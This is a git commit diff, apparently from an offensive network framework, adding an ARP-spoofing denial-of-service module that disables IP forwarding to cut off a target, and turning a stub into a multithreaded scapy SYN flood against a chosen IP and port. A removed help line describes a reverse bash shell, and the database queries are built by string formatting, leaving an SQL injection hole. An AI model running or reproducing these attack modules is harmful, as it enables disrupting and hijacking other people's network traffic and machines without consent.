3f1f113a287918683aaabfa3a8b9ef96e4bee3aa
George Hughey <ghughey@umd.edu>
2016-10-25 05:19:11 +0000

    Addded DOS module

---
+++ capabilities/dos/arpDos.py
@@ -0,0 +1,55 @@
+from arpBegin import *
+import os
+from capability import *
+
+#masq_ip: ip we masquerade as.
+#masc_mac: Masqueraded mac address
+#source_mac: Our mac address
+#Dest IP: target ip
+#Dest Mac: target mac address
+#ex: arpSpoof("10.0.0.1", "00:0c:29:5f:e7:50", "b8:27:eb:c2:1c:52", "10.0.0.57", "00:0c:29:08:45:1a")
+class arpDos(Capability):
+
+    def __init__(self, core):
+        super(arpDos, self).__init__(core)
+        self.name = "Arp Dos"
+        '''self.options = {
+            "masq_ip"   : Option("masq_ip", "", "IP to Masquerade as", True),
+            "masq_mac"   : Option("masq_mac", "", "MAC to Masquerade as", True),
+            "source_mac"   : Option("source_mac", "", "Mac Address to send traffic to", True),
+            "dest_ip"   : Option("dest_ip", "", "IP address of target", True),
+            "dest_mac"   : Option("dest_mac", "", "Mac address of target", True),
+        }'''
+        self.options = {
+            "masq" : Option("masq", "", "ID of the computer to masquerade as", True),
+            "source": Option("source", "", "ID of the source computer", True),
+            "dest": Option("dest", "", "ID of the target", True),
+            }
+        self.help_text = INFO + "Spoof the arp table of a target with our ip. We will not forward their traffic, effectively DOSsing them."
+    
+    def exec_command(self, comm):
+        self.core.cur.execute(comm)
+        return self.core.cur.fetchall()[0][0]
+    
+    def getVars(self):
+        self.masq_ip = self.exec_command("SELECT IP FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("masq")))
+        self.masq_mac = self.exec_command("SELECT MAC FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("masq")))
+        self.source_ip = self.exec_command("SELECT IP FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("source")))
+        self.source_mac = self.exec_command("SELECT MAC FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("source")))
+        self.dest_ip = self.exec_command("SELECT IP FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("dest")))
+        self.dest_mac = self.exec_command("SELECT MAC FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("dest")))
+
+    def arpGo(self):
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+        return arpBegin(self.masq_ip, self.masq_mac, self.source_mac, self.dest_ip, self.dest_mac)
+   
+    def restore(self):
+        self.getVars()
+        self.proc.terminate()
+        arpEnd(self.masq_ip, self.masq_mac, self.dest_ip, self.dest_mac)
+
+    def launch(self):
+        self.getVars()
+        self.proc = self.arpGo()
+        return self.proc
+        
--- capabilities/dos/syn.py
+++ capabilities/dos/syn.py
@@ -1,14 +1,41 @@
 from capability import *
-
+from scapy.all import *
+import multiprocessing
 class Syn(Capability):
     
     def __init__(self, core):
         super(Syn, self).__init__(core)
-        self.name = "Syn Scan"
+        self.name = "Syn Flood"
         self.options = {
-                "port"   : Option("port", 53923, "port to connect to", True),
+                "port"   : Option("port", 80, "port to flood", True),
+                "target" : Option("target", "", "IP of target to attack", True),
+                "num"    : Option("num", 2000, "Number of packets to send", True),
+                "inter"  : Option("inter", 0.3, "Interval between sending packets", True),
+                "threads": Option("threads", 3, "Number of threads", True),
                 }
-        self.help_text = INFO + "Uses a simple bash command to connect to a specific ip and port combination, and pipes its input into a bash shell." 
+        self.help_text = INFO + "Sends tons of packets to an IP in the hopes of DOSing the computer." 
 
+    def exec_command(self, comm):
+        self.core.cur.execute(comm)
+        return self.core.cur.fetchall()[0][0]
+
+    def flood(self):
+        p = IP(dst=self.get_value("target"), id=1111, ttl=99)/TCP(sport=RandShort(), dport=int(self.get_value("port")), seq=12345, ack=1000, window=1000, flags="S")/"Payload"
+        ans, unans = srloop(p, inter=float(self.get_value("inter")), retry=2, timeout=4, verbose=1)
+        print "Summary of answered & unanswered packets"
+        ans.summary()
+        unans.summary()
+        print "source port flags in response"
+        ans.make_table(lambda(s, r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
+    
     def launch(self):
-        pass
+        self.threads = []
+        for i in range(1, int(self.get_value("threads"))+1):
+            print "Beginning thread" + str(i)
+            self.threads.append(multiprocessing.Process(target=self.flood, args=()))
+            self.threads[i-1].start()
+
+    def restore(self):
+        for i in range(1, int(self.get_value("threads"))+1):
+            self.threads[i-1].terminate()
+            print "Terminating thread " + str(i)
